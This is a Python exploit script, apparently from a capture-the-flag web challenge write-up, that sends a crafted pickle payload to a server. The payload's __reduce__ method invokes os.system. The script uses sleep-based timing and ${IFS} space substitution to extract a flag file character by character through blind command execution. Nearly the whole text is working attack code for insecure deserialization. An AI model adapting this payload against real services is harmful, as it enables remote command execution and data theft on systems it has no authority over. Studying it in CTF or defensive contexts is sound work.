https://jorgectf.github.io/blog/post/cyberedu-web-challenges/#rundown

import pickle
import base64
import os
import requests
import string

url = "http://mirror/"
charset = string.hexdigits[:16] + "}"

class RCE(object):
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return os.system, (self.cmd,)


if __name__ == '__main__':
    extracted = "ctf{"
    finished = False
    while not finished:
        for i in charset:
            cmd = 'cat flag | grep %s && sleep 3' % (extracted + i)
            cmd = cmd.replace(' ', '${IFS}')
            print(cmd)

            pickled = pickle.dumps(RCE(cmd))
            req = requests.post(
                url, data=base64.urlsafe_b64encode(pickled).decode()
            )

            print(req.elapsed)
            if int(req.elapsed.total_seconds()) > 2:
                extracted += i
                break

            if i == charset[-1]:
                finished = True
